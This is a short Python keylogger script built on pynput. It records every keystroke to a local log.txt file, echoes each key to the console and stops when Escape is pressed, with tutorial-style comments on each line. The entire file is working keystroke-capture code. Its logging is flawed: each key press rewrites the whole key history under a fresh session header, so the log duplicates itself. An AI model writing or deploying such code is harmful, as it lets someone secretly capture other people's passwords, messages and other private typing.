import os  # Module for interacting with the operating system
import pynput  # Importing the pynput module for keyboard monitoring
from pynput.keyboard import Key, Listener  # Importing specific classes from pynput
import datetime  # Module for working with dates and times

keys = []  # List to store pressed keys
file_name = "log.txt"  # Name of the log file

# Create full file path using the current working directory
file_path = os.path.join(os.getcwd(), file_name)

# Function to handle key press event
def on_press(key):
    keys.append(key)
    write_file(keys)  # Call the write_file function to write keys to the log
    print(f"{key} is pressed")  # Print the pressed key to console

# Function to write keystrokes to the log file
def write_file(keys):
    with open(file_path, "a") as f:  # Open the file in append mode
        if len(keys) > 0:  # Check if there are keys to write
            f.write("\nNew Session: " + str(datetime.datetime.now()))  # Write new session header
            for key in keys:
                k = str(key).replace("'", "")  # Remove single quotes from keys
                if k.find("space") > 0:
                    f.write("\n")  # If it's a space, write a newline
                elif k.find("Key.") == -1:
                    f.write(str(key))  # Write the key to the file

# Function to handle key release event
def on_release(key):
    if key == Key.esc:  # If Escape key is pressed
        with open(file_path, "a") as f:  # Open file in append mode
            f.write("\nEnd of Session \n\n")  # Mark end of session in the log file
        return False  # Stop the listener

# Create a listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()  # Start listening for key events
